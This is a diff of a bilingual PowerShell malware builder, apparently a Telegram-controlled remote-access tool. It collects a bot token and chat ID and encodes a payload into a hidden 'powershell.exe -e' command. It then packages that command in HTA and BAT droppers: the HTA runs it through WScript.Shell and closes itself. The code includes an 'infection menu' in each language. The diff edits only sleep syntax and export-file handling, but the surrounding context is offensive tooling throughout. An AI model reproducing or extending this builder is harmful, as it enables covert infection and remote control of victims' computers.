@@ -1,4 +1,5 @@
 clear
+$Linux = uname
 $ErrorActionPreference = "SilentlyContinue"
 $version = "0.5"
 
@@ -26,7 +27,7 @@ do
            '1' {
 		cls 
         $idioma = "Spanish"
-        IEX $show_banner ; sleep -Seconds 0.1		
+        IEX $show_banner ; sleep 0.1		
         Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
 		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
 		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el delay para la conexion: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
@@ -99,8 +100,8 @@ $code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -e
 
 ######################################################## Tipos de Archivos #######################################################################
 
-$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu codigo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
-$your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1'
+$tu_codigo = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu codigo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
+$your_code =  'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Your code is: `n`n" -ForegroundColor Green -NoNewline  ; sleep 1'
 $plantilla_hta = "<html><head><script>var c= '$code' new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
 $plantilla_bat = '@echo off
 start /b ' + $code + '
@@ -140,15 +141,13 @@ do
 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] � Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
-     {    'S' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Escriba la ruta para expotar el archivo : " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
-        $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; 
-        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] El archivo se exporto : " -ForegroundColor Green -NoNewline ; Write-Host (ls $salida).FullName "`n`n" -NoNewline
-        }
+     { 'S' { 	 $salida = "temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida 
+        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] El archivo se exporto : " -ForegroundColor Green -NoNewline ; Write-Host $salida"`n`n" -NoNewline
         } 'N' {return ;exit 	
 		
-           }  
-     } 
-} 
+           }   
+ 	 }
+}
 until ($input -eq "S" -or $input -eq "N")}
 
 function Exportar-File { param ($plantilla,$tipo)
@@ -157,9 +156,8 @@ do
   
       Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Do you want to export the code to a file? (Y/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
-     {    'Y' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Enter the path to export the file: " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
-        $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} 
-        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] The file is exported: " -ForegroundColor Green -NoNewline ; Write-Host (ls $salida).FullName "`n`n" -NoNewline
+     {    'Y' {  $salida = "temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida 
+        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] The file is exported: " -ForegroundColor Green -NoNewline ; Write-Host $salida"`n`n" -NoNewline
         } 'N' {return ;exit 	
 		
            }  
@@ -167,7 +165,7 @@ do
 } 
 until ($input -eq "Y" -or $input -eq "N")}
 
-############################################################### Menú de infeccion Ingles ###############################################################
+############################################################### Menu de infeccion Ingles ###############################################################
 
 if ($idioma -eq "English"){
 do 
@@ -197,7 +195,7 @@ until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $inpu
 }
 
 
-############################################################### Menú de infeccion Castellano ###############################################################
+############################################################### Menu de infeccion Castellano ###############################################################
 
 if ($idioma -eq "Spanish"){
 do 
